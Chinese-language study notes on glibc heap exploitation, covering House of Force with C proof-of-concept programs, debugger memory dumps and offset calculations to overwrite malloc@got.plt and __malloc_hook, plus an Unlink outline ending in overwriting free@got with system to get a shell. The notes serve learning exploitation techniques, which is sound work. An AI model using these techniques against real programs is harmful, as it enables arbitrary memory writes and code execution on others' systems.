[toc]



# House Of Force

需要以下条件：

1.  能够以溢出等方式控制到 top chunk 的 size 域
2.  能够自由地控制堆分配尺寸的大小

## 示例1

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

malloc并且将top chunk的size域改为0xffffffffff后：

```shell
0x602000:   0x0000000000000000  0x0000000000000021 <=== ptr
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0xffffffffffffffff <=== top chunk size域被更改
0x602030:   0x0000000000000000  0x0000000000000000

0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x0000000000602020 <=== top chunk此时一切正常
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78

0x601020:   0x00007ffff7a91130 <=== malloc@got.plt
```

之后会执行malloc(-4120)，这里说下为什么是-4120，0x601020 是 `malloc@got.plt` 的地址，0x601020-0x602010=-4120

## 示例2

刚才的是修改低地址的got表内容，下面修改高地址空间的内容：

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算

`0x7ffff7dd1b00-0x602020-0x10=140737345551056` 

经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00

```shell
0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x00007ffff7dd1b00 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
```

之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了

>   往低地址就是两者(low_addr-0x10)-top_addr
>
>   往高地址，就是(high_addr-0x10-top_addr)-0x10



# Unlink

## 条件

1.  UAF，可修改free状态下smallbin或unsortedbin的fd和bk指针
2.  已知位置存在一个指针指向可进行UAF的chunk

## 效果

使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18

## 思路

设指向可 UAF chunk 的指针的地址为 ptr

1.  修改 fd 为 ptr - 0x18
2.  修改 bk 为 ptr - 0x10
3.  触发 unlink

ptr 处的指针会变为 ptr - 0x18。

## 利用思路

伪造一个空闲 chunk。
通过 unlink 把 chunk 移到存储 chunk 指针的内存处。
覆盖 chunk 0 指针为 free@got 表地址并泄露。
覆盖 free@got 表为 system 函数地址。
申请chunk的内容为“/bin/sh”，调用 free 函数拿 shell。

